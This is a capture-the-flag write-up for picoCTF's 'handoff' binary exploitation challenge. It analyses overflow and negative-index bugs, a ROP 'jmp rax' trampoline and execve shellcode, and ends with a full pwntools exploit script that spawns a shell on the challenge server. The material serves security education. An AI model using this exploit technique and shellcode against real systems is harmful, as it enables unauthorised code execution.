# handoff #
 
## Overview ##

400 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #bufferoverflow #writewhatwhere #ASLR #ROP #gadget`

## Description ##

Download the binary here
Download the source here
Connect to the program with netcat: $ nc <server> <port>

## Approach ##

Analysing the provided challenge `handoff.c` source file, a number of issues with bounds checking are identified.

1. Menu item "`1. Add a new recipient`" contains a potential buffer overflow condition.

      #define NAME_LEN 32

      typedef struct entry {
        char name[8];
        char msg[64];
      } entry_t;

      // Add a new entry
      puts("What's the new recipient's name: ");
      fflush(stdin);
      fgets(entries[total_entries].name, NAME_LEN, stdin);
      total_entries++;

  The `fgets()` size parameter `NAME_LEN` allows for `32` bytes to be written (-1 for null termination), when the target store `entry_t.name` is `8` bytes.

2. Menu item "`2. Send a message to a recipient`" contains a potential buffer underflow condition.

      else if (choice == 2) {
        choice = -1;
        puts("Which recipient would you like to send a message to?");
        if (scanf("%d", &choice) != 1) exit(0);
        getchar();

        if (choice >= total_entries) {
          puts("Invalid entry number");
          continue;
        }

        puts("What message would you like to send them?");
        fgets(entries[choice].msg, MSG_LEN, stdin);        

  The bounds checking to ensure the `choice` is a valid entry that exists, checks only the upper limit (how many entries exist), the user can enter a negative number and satisfy the `(choice >= total_entries)` condition and underflow the `entries[]` array. We can underflow this buffer by a significant distance from our buffer with large negative numbers as array indexes (`entries[choice]`) and given this operates within a loop, we can spray data over a large range (not without some fragmentation - the `name[]` buffer of `entry_t`).

3. Lastly, menu item "`3. Exit the app`" contains a potential buffer overflow condition, similar to (1).

      #define NAME_LEN 32

      char feedback[8];

      else if (choice == 3) {
        choice = -1;
        puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
        fgets(feedback, NAME_LEN, stdin);
        feedback[7] = '\0';
        break;
      }

  The `fgets()` size parameter `NAME_LEN` allows for `32` bytes to be written (-1 for null termination), when the `feedback` buffer is only `8` bytes in size. An important note with this overflow is that our buffer doesn't survive completely unmolested, with a null termination character being written over our input via the `feedback[7] = '\0';` statement.

Checking `handoff` binary security:

    $ checksec handoff
    [*] '/home/user/picoCTF/handoff/handoff'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments

Non-PIE, allows for usage of fixed code addresses.
The stack isn't protected either via canaries of preventing execution.

Given the simple nature of the binary and the unprotected stack, this let me towards trying to construct shellcode to execute a shell and jump to this code via a patched return address.

Inspecting the binary segments, for any other target areas:

    $ readelf -l handoff

    Elf file type is EXEC (Executable file)
    Entry point 0x401110
    There are 13 program headers, starting at offset 64

    Program Headers:
      Type           Offset             VirtAddr           PhysAddr
                     FileSiz            MemSiz              Flags  Align
      PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
                     0x00000000000002d8 0x00000000000002d8  R      0x8
      INTERP         0x0000000000000318 0x0000000000400318 0x0000000000400318
                     0x000000000000001c 0x000000000000001c  R      0x1
          [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
      LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                     0x00000000000006c0 0x00000000000006c0  R      0x1000
      LOAD           0x0000000000001000 0x0000000000401000 0x0000000000401000
                     0x00000000000004d5 0x00000000000004d5  R E    0x1000
      LOAD           0x0000000000002000 0x0000000000402000 0x0000000000402000
                     0x0000000000000360 0x0000000000000360  R      0x1000
      LOAD           0x0000000000002e10 0x0000000000403e10 0x0000000000403e10
                     0x0000000000000250 0x0000000000000270  RW     0x1000
      DYNAMIC        0x0000000000002e20 0x0000000000403e20 0x0000000000403e20
                     0x00000000000001d0 0x00000000000001d0  RW     0x8
      NOTE           0x0000000000000338 0x0000000000400338 0x0000000000400338
                     0x0000000000000020 0x0000000000000020  R      0x8
      NOTE           0x0000000000000358 0x0000000000400358 0x0000000000400358
                     0x0000000000000044 0x0000000000000044  R      0x4
      GNU_PROPERTY   0x0000000000000338 0x0000000000400338 0x0000000000400338
                     0x0000000000000020 0x0000000000000020  R      0x8
      GNU_EH_FRAME   0x00000000000021c8 0x00000000004021c8 0x00000000004021c8
                     0x0000000000000054 0x0000000000000054  R      0x4
      GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                     0x0000000000000000 0x0000000000000000  RWE    0x10
      GNU_RELRO      0x0000000000002e10 0x0000000000403e10 0x0000000000403e10
                     0x00000000000001f0 0x00000000000001f0  R      0x1

Disassembling the binary and analysing:

    $ objdump -M intel -d valley > objdump_valley.txt

We can construct the stack layout within the `vuln()` function, that is called by `main()` with the location of local variables and important bits of the previous stack frame. I find it easier to scribble these things out to better visualise the data and its layout.

                             (top of the stack)
                      |                             |
                      |-----------------------------|
           $rbp-0x2e4 |           choice            |
                      |-----------------------------|
           $rbp-0x2e0 |      entries[0].name[]      |
                      |   ----------------------    |
           $rbp-0x2d8 |      entries[0].msg[]       |
                      |-----------------------------|
                      |             .               |
                      |             .               |
                      |                             |
                      |      entries[1..9]          |
                      |             .               |
                      |             .               |
                      |-----------------------------|
           $rbp-0x0c  |         feedback[]          |
                      |-----------------------------|
           $rbp-0x04  |       total_entries         |
                      |-----------------------------|
           $rbp       |  Saved $rbp (main() frame)--|----+
                      ===============================    |
                      | Return address (<main+18>)  |    |
                      |-----------------------------|    |
                      |                             |<---+

At this point I got stuck for quite a while, as I can to the realisation that I didn't yet have any form of infoleak to deal with the assumption that the challenge would be operating under Address Space Layout Randomisation (ASLR) and I had no clue of the absolute addresses of these were on the stack. Which would be required to construct the shellcode (pointer to `"/bin/sh\0"`) and in particular the jump to this shellcode.

Eventually I decided to carefully analyse the register states after completion of the various menu item code blocks, to see if there was any information left around in registers I could use.

I found in all three cases `$rax` was left intact and pointing to our respective buffers of interest. 

    Breakpoints of interest:
      - 0x40126c    = return from scanf(choice)
      - 0x4012f8    = return from fgets(name)     [choice = 1]
      - 0x4013b1    = return from fgets(message)  [choice = 2]
      - 0x4013ed    = return from fgets(feedback) [choice = 3]

    Registers of interest at the above breakpoints;
      1. $rdi = &choice
      2. $rax = entries[total_entries].name
      3. $rax = entries[total_entries].message
      4. $rax = feedback

Which led me to start looking at available ROP gadgets utilising `$rax`.

    $ ROPgadget --binary handoff | grep rax
    0x00000000004014bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
    0x0000000000401440 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
    0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
    0x00000000004011da : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x00000000004014be : add byte ptr [rax], al ; endbr64 ; ret
    0x000000000040113c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
    0x0000000000401442 : add byte ptr [rax], al ; pop rbp ; ret
    0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
    0x00000000004011d9 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    0x000000000040113b : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
    0x0000000000401225 : call qword ptr [rax + 0xff3c35d]
    0x000000000040140b : call qword ptr [rax + 0xff3c3c9]
    0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
    0x0000000000401014 : call rax
    0x000000000040149c : fisttp word ptr [rax - 0x7d] ; ret
    0x0000000000401012 : je 0x401016 ; call rax
    0x0000000000401165 : je 0x401170 ; mov edi, 0x404060 ; jmp rax
    0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
    0x000000000040116c : jmp rax
    0x0000000000401167 : mov edi, 0x404060 ; jmp rax
    0x00000000004011ec : nop dword ptr [rax] ; endbr64 ; jmp 0x401180
    0x00000000004013a0 : or byte ptr [rax - 0x77], cl ; retf 0x40be
    0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
    0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
    0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
    0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
    0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404060 ; jmp rax
    0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
    0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
    0x00000000004011d8 : wait ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret

With these in particular catching my eye - we could call or jump directly to our target buffer:

    0x0000000000401014 : call rax
    0x000000000040116c : jmp rax

### Plan of Attack ###

With the mechanism now understood, it was time to devise a plan of attack, which took many iterations, but my final solution ended up being:

1. create an entry using menu item (1), the contents of `name` is not important, this is really just so we have an entry to use menu item (2).
2. use menu item (2) to write a message, this is where we will construct our shellcode (`entries[0].msg)`, as we have plenty of space (64 bytes) and no need for buffer overflow or underflows.
3. use menu item (3) to exit `vuln()` but firstly overflowing the `feeedback` buffer to hijack the return address using our `jmp rax` gadget at `0x40116c` and following a series of jumps until we get to the shellcode.

The astute may already be wondering if `$rax` points to our `feedback` buffer as a result of using menu item (3), how are we going to get to our shellcode up in `entries[0].msg`? This took some fiddling around, but the answer was to use `feedback` as a place to construct another jump up to our shellcode, as the offset between `feedback` and `entries[0].msg` doesn't change, just the entire stack moves around with ASLR.

You may be thinking, why go to all this trouble? Why not just put the shellcode within `feedback` and be done with it. Space limitations mainly and the fact the 8'th byte gets overwritten with a null termination byte complicates things.

### Implementation ###

Starting the explanation with step 3, above - the overflow of `feedback`. The construction of this overflow has two core goals;

- replace the `vuln()` return address with our `jmp $rax` ROP gadget address, which is just a known absolute address we put in our payload.
- construct another jump from within this area to our shellcode. This was done knowing the value of `$rax` was currently pointing to `feedback` (at `$rbp-0x0c`) and we want to jump to `entries[0].msg[]` (at `$rbp-0x2d8`). So a simple subtraction from `$rax` we can then execute another `jmp $rax` to reach our shellcode. 

These two instructions (sub $rax, and jmp $rax) were 8 bytes. But `feedback[7]` gets overwritten with that null termination character!

So what I ended up doing was having another relative jump at the start of feedback, that jumped to these two instructions that I ended up storing after `feedback`, within `total_entries` location.

So the final `feedback` payload structure looks like:

    <JMP 0x6><NOP x6><SUB $RAX, 0x2CC><JMP $RAX><'AAAA' padding><JMP_RAX_ROP_GADGET_ADDRESS>

The shellcode constructed for step 2, above - for the `entry[0]` message payload is fairly run of the mill.

    shellcode = asm("""
      mov rdi, rax
      add rdi, (64 - 9)
      mov rax, 59
      xor rsi, rsi
      xor rdx, rdx
      syscall
      mov rax, 0x40143f
      jmp rax
      """, arch = 'amd64')

So the final `entry[0]` message payload structure looks like:

    <shellcode><NOP padding><"/bin/sh\0" string>

We just use the fact the buffer is a total of 64 bytes, we place our `"/bin/sh\0
"` string at the bottom of this, and knowing `$rax` points to the start of our shellcode at `entries[0].msg` we can calculate `$rdi` accordingly.

To clean up after executing the shell, I just jump to `<main+48>` (at `0x40143f`) to exit the challenge binary in a slightly more orderly fashion.

All of this in practice results in the following jump structure, steps (a) through to (d):

                              (.text code segment)
                                     .
                      |              .                |
                      |-------------------------------|
            +-------->|            JMP $RAX           | 0x40116c
            |    +----|--*     ( our ROP gadget )     |
            |    |    |-------------------------------|
            |    |    |              .                |
            |   (b)                  .
            |    |
            |    |
            |    |
            |    |            (top of the stack)
            |    |    |                               |
            |    |    |-------------------------------|
            |    |    |            choice             |
            |    |    |-------------------------------|
            |    |    |       entries[0].name[]       |
            |    |    |   ------------------------    |
            |    |    |       entries[0].msg[]        |<-------+
            |    |    |                               |        |
            |    |    |       { our shellcode }       |        |
            |    |    |                               |        |
            |    |    |-------------------------------|        |
            |    |    |              .                |        |
            |    |    |              .                |        |
            |    |    |       entries[1..9]           |        |
            |    |    |              .                |        |
            |    |    |              .                |        |
            |    |    |-------------------------------|        |
            |    +--->|         feedback[]            |        |
            |  +--(c)-|-JMP re|   |   |   |   |   | 0 |        |
            |  |      |-------------------------------|        |
            |  +----->|        total_entries          |        |
            |         | SUB EAX, 0x2CC    | JMP $RAX--|--(d)---+
            |         |-------------------------------|     
            |         |   Saved $rbp (main() frame)   |     
            |         =================================     
            +---(a)---|--*     Return address         |     
                      |-------------------------------|    
                      |                               |

Note that the `Saved $rbp` entry at `$rbp` does get clobbered by the code added at `total_entries` as this required 8 bytes for the instructions and `total_entries` is only 4 bytes. But we don't need to worry about preserving `main()`'s stack frame so much anyway.

## Solution ##

The [pwntools](https://docs.pwntools.com/en/stable/) script I used that during the event:

    #!/usr/bin/env python3

    from pwn import *

    target_elf = ELF("./handoff")

    # command line support for local, remote and gdb modes
    if len(sys.argv) > 1:
      if "remote" in sys.argv:
        if len(sys.argv) > 3:
          target_proc = remote(sys.argv[2], sys.argv[3])
        else:
          print('usage: ./pwn-game.py remote <server> <port>')
          exit(1)
      elif "gdb" in sys.argv:
        target_proc = target_elf.process()
        gdb.attach(target_proc)
    else:
      target_proc = target_elf.process()


    # add an entry (name = NOP sled)
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'1');
    target_proc.recvuntil(b'What\'s the new recipient\'s name:')
    target_proc.sendline(b'\x90' * 30)

    # write a message with our shellcode, for entries[0]
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'2');
    target_proc.recvuntil(b'Which recipient would you like to send a message to?')
    target_proc.sendline(b'0')
    target_proc.recvuntil(b'What message would you like to send them?')
    random_shellcode = asm("""
      mov rdi, rax
      add rdi, (64 - 9)
      mov rax, 59
      xor rsi, rsi
      xor rdx, rdx
      syscall
      mov rax, 0x40143f
      jmp rax
      """, arch = 'amd64')
    print('shellcode = ' + str(len(random_shellcode)) + ' bytes')
    random_shellcode += b'\x90'*(64-9-len(random_shellcode))
    random_shellcode += b'/bin/sh\x00'
    target_proc.sendline(random_shellcode)

    # overflow feedback
    target_proc.recvuntil(b'3. Exit the app\n')
    target_proc.sendline(b'3')
    payload = b'\xeb\x06' + b'\x90'*6   # jmp to <total_entries>
    payload += asm("""
      sub rax, (0x2D4 - 8)              
      jmp rax                           
     """, arch = 'amd64')
    # $rax=<feedback> sub to get to <entries[0].message>
    # jump to our shellcode
    payload += b'A'*4 + p64(0x40116c) # pad remainder of saved rbp, set ret to "jmp rax" gadget
    print(len(payload))
    target_proc.sendline(payload)

    target_proc.interactive()

The resulting output from running against the challenge server:

    $ ./pwn-handoff.py remote shape-facility.picoctf.net 57964
    [*] '/home/user/picoCTF/handoff/handoff'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments
    [+] Opening connection to shape-facility.picoctf.net on port 57964: Done
    shellcode = 31 bytes
    28
    [*] Switching to interactive mode
    Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
    $ ls
    flag.txt
    handoff
    start.sh
    $ cat flag.txt
    picoCTF{...........redacted.............}$ 
    $ exit
    [*] Got EOF while reading in interactive
    [*] Interrupted
    [*] Closed connection to shape-facility.picoctf.net port 57964

Where the actual flag value has been redacted for the purposes of this write up.
